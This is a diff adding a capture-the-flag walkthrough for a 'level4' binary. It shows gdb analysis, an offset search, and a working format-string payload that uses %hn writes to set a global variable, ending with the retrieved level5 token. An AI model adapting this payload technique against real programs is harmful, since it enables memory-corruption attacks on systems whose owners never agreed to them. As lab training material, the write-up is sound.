@@ -1,0 +1,30 @@
+Step 1: Analyze the binary
+    $ gdb ./level4
+    (gdb) info functions
+    (gdb) disassemble n
+    (gdb) disassemble p
+
+Step 2: Identify the vulnerability and win condition
+    - The function p() uses printf(user_input) -> Format String vulnerability.
+    - The function n() checks if a global variable (0x8049810) equals 0x1025544.
+    - If true, the program directly outputs the level5 password.
+
+Step 3: Find the offset for the format string
+    $ echo "BBBB.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x" | ./level4
+    Output: BBBB.b7ff26b0.bffff784....42424242
+    The '42424242' (BBBB) appears at the 12th position -> Offset is 12.
+
+Step 4: Craft the exploit
+    Goal: Write 0x1025544 to address 0x8049810.
+    Strategy: Split the write into two 2-byte writes (using %hn).
+        - Write 0x5544 to the lower bytes at 0x8049810.
+        - Write 0x0102 to the higher bytes at 0x8049812.
+
+    The exploit payload is:
+        "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%21820u%12$hn" + "%43966u%13$hn"
+
+Step 5: Execute the exploit
+    $ (python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%21820u%12$hn" + "%43966u%13$hn"'; cat) | ./level4
+    Output: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+Success! The token for level5 is retrieved.
